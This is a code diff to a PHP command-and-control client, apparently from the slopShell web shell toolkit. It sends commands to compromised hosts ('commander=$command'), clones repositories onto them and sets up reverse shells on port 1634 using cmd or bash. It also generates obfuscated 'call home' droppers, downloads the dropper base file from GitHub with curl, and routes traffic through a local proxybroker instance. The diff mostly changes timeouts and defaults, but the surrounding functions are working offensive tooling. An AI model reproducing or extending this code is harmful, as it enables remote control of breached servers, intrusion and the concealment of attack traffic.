@@ -9,11 +9,11 @@ $cof = array(
     "password"=>"",
     "dbname"=>"sloppy_bots"
     );
-// this is failing to execute, but does work everywhere else.
+
 pclose(popen("nohup proxybroker serve --host 127.0.0.1 --port 8090 --types HTTPS HTTP --lvl High &", "r"));
 is_file("sloppy_config.ini") ? define("config", parse_ini_file('sloppy_config.ini', true)):define("config", $cof);
 try{
-//    $ch = curl_init();
+
     define("CHH", curl_init());
     curl_setopt(CHH, CURLOPT_USERAGENT,       config['useragent']);
     curl_setopt(CHH, CURLOPT_PROXY,           config["proxy"]);
@@ -71,8 +71,8 @@ function sys($host, $uri)
 {
     if (!empty($host) && !empty($userA)) {
         curl_setopt(CHH, CURLOPT_URL,               "$host/$uri?qs=cqBS");
-        curl_setopt(CHH, CURLOPT_TIMEOUT,                              5);
-        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       5);
+        curl_setopt(CHH, CURLOPT_TIMEOUT,                              15);
+        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       15);
         curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
         $syst = curl_exec(CHH);
         if (!curl_errno(CHH)){
@@ -97,7 +97,7 @@ function rev($host, $shell, $port, $os)
     if (isset($host) and isset($port)) {
         if ($port === "default" && $shell === "default" && $os === "win") {
             $usePort = "1634";
-            $Ushell = "powershell";
+            $Ushell = "cmd";
         } elseif($os === "lin") {
             $usePort = "1634";
             $Ushell = "bash";
@@ -119,8 +119,8 @@ function co($command, $host, $uri)
 {
     if (!empty($host) && !empty($command) && !empty($uri)) {
         curl_setopt(CHH, CURLOPT_URL,                       "$host/$uri");
-        curl_setopt(CHH, CURLOPT_TIMEOUT,                              5);
-        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       5);
+        curl_setopt(CHH, CURLOPT_TIMEOUT,                              15);
+        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       15);
         curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
         curl_setopt(CHH, CURLOPT_POST,                              true);
         curl_setopt(CHH, CURLOPT_POSTFIELDS,        "commander=$command");
@@ -144,8 +144,8 @@ function clo($host, $repo, $uri)
 {
     if (!empty($host) && !empty($repo) && !empty($uri)){
         curl_setopt(CHH, CURLOPT_URL,                       "$host/$uri");
-        curl_setopt(CHH, CURLOPT_TIMEOUT,                              5);
-        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       5);
+        curl_setopt(CHH, CURLOPT_TIMEOUT,                              15);
+        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       15);
         curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
         curl_setopt(CHH, CURLOPT_POST,                              true);
         curl_setopt(CHH, CURLOPT_POSTFIELDS,               "clone=$repo");
@@ -167,6 +167,7 @@ function clo($host, $repo, $uri)
 }
 
 function createDropper($callHome, $duration, $extras, $obfsucate){
+    require "includes/droppers/dynamic_generator.php";
     $file_in = 'includes/droppers/base.php';
     $ob = 'includes/droppers/obfuscated/'.bin2hex(random_bytes(rand(5,25))).'.php';
     $n = 'includes/droppers/raw/'.bin2hex(random_bytes(rand(5,25))).'.php';
@@ -178,7 +179,7 @@ function createDropper($callHome, $duration, $extras, $obfsucate){
                     break;
                 case false:
                     echo "Downloading dropper from github....\n";
-                    system("curl https://raw.githubusercontent.com/oldkingcone/slopShell/master/includes/droppers/base.php -o includes/droppers/base.php -vH 'User-Agent: Mozilla/5.0'");
+                    system("curl https://raw.githubusercontent.com/oldkingcone/slopShell/master/includes/base.php -o includes/base.php -vH 'User-Agent: Mozilla/5.0'");
                     break;
                 default:
                     echo "Something went wrong..\n";
